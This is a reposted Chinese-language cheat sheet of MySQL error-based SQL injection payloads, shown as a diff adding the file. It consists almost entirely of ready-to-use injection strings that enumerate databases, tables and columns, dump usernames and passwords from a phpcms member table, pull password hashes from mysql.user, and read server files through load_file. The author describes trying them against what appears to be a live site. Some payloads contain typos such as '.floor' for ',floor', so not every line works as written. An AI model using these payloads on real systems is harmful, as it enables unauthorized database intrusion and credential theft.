@@ -1,0 +1,85 @@
+[【转载】] Mysql暴错注入参考 转载
+Mysql5.0.91下测试通过,对于5+的绝大部分版本可以测试成功
+小部分版本使用name_const()时会报错.可以用给出的Method.2测试
+
+
+mysql报错注入
+                                                  mysql报错注入
+
+大家好 我是~  式 QQ:40497992
+没保存 算了 就是这种 无乱是and 1=1 1=2都是返回正常页面的
+盲猪也是没戏的 字段19
+网上貌似有介绍都这个注入代码的 
+但是很多测试都没成功
+嘎嘎 这些百度都有 不过很少
+下面我来演示一下 怎么进行 报错注入
+爆所有库
+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,schema_name,0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+接着下去也是可以查出所有库的
+
+爆当前数据库
+and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,hex(cast(database() as char)),0x27,0x7e)) from
+information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+415256303332 这个就是hex 当前库的 转换一下看看 ARV032 就是这个
+接着
+暴表
+and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,hex(cast(table_name as char)),0x27,0x7e) from information_schema.tables where table_schema=0x415256303332 limit 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+70687062625F61636C5F67726F757073 还需要转换一下
+phpbb_acl_groups 这个不是 玩个phpcms2008的人都知道 是phpcms_member 这个才对 大家就自已去查询把 只要改一下数字就行了
+爆字段
+and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from information_schema.columns where table_schema=0x415256303332 and table_name=0x706870636D735F6D656D626572 limit 0,1)) from
+information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+username password
+爆内容
+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,phpcms_member.username,0x27,0x7e) from phpcms_member limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+
+
+
+
+
+查询版本:
+Method.1:and+exists(select*from+(select*from(select+name_const(@@version,0))a+
+join+(select+name_const(@@version,0))b)c)
+Method.2:and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(SELECT+version()))a+from+information_schema.tables+gro
+up by a)b)
+查询当前用户:
+Method.1:and+exists(select*from+(select*from(select+name_const(user(),0))a+join+(select+name_const(user(),0))b)c)
+Method.2:and+(select+1+from(select+count(*),concat((select+(select+user())+from+information_schema.tables+limit+0,1).floor(r
+and(0)*2))x+from+information_schema.tables+group+by+x)a)
+查询当前数据库:
+Method.1:and+exists(select*from+(select*from(select+name_const(database(),0))a+join+(select+name_const(database(),0))b)c)
+Method.2:and+(select+1+from(select+count(*),concat((select+(select+database())+from+information_schema.tables+limit+0,1).flo
+or(rand(0)*2))x+from+information_schema.tables+group+by+x)a)
+依次爆库and+exists(select*from+(select*from(select+name_const((SELECT+distinct+schema_name+FROM+information_schema.schemata+
+LIMIT+n,1),0))a+join+(select+name_const((SELECT+distinct+schema_name+FROM+information_schema.schemata+LIMIT+n,1),0))b)c) 将n
+顺序替换
+爆指定库数目:
+and+(select+1+from(select+count(*),concat((select+(select+(SELECT+count(table_name)+FROM+`information_schema`.tables+WHERE+t
+able_schema=0x6D7973716C))+from+information_schema.tables+limit+0,1),floor(rand(0)*2))x+from+information_schema.tables+group
++by+x)a)+and+1=1 0x6D7973716C=mysql
+依次爆表:
+and+(select+1+from(select+count(*),concat((select+(select+(SELECT+distinct+table_name+FROM+information_schema.tables+Where+table_schema=0x6D7973716C+limit+n,1))+from+information_schema.tables+limit+0,1).floor(rand(0)*2))x+from+information_schema.ta
+bles+group+by+x)a)+and+1=1
+0x6D7973716C=Mysql 将n顺序替换
+爆表内字段数目:
+and+(select+1+from(select+count(*),concat((select+(select+(SELECT+count(column_name)+FROM+`information_schema`.columns+WHERE
++table_schema=0x6D7973716C+AND+table_name=0x636F6C756D6E735F70726976))+from+information_schema.tables+limit+0,1),floor(rand(
+0)*2))x+from+information_schema.tables+group+by+x)a)+and+1=1
+依次爆字段:
+and+(select+1+from(select+count(*),concat((select+(select+(SELECT+distinct+column_name+FROM+information_schema.columns+Where
++table_schema=0x6D7973716C+AND+table_name=0x636F6C756D6E735F70726976+limit+n,1))+from+information_schema.tables+limit+0,1),loor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+1=1 将n顺序替换
+依次暴内容:
+and+(select+1+from(select+count(*),concat((select+(select+(select+password+from+mysql.user+limit+n,1))+from+information_sche
+ma.tables+limit+0,1).floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)+and+1=1
+将n顺序替换
+爆文件内容:
+and+(SELECT+1+FROM+(select count(*),concat(floor(rand(0)*2),(SELECT+substring(load_file(0x433A5C5C746573742E617361),1,64)))a
+from+information_schema.tables+group+by+a)b)
+0x433A5C5C626F6F742E696E69=C:\\boot.ini 因为只能爆出64字节的内容,需要用Substring()控制显示的字节
+Thx for reading. 
+
+
+
+
+
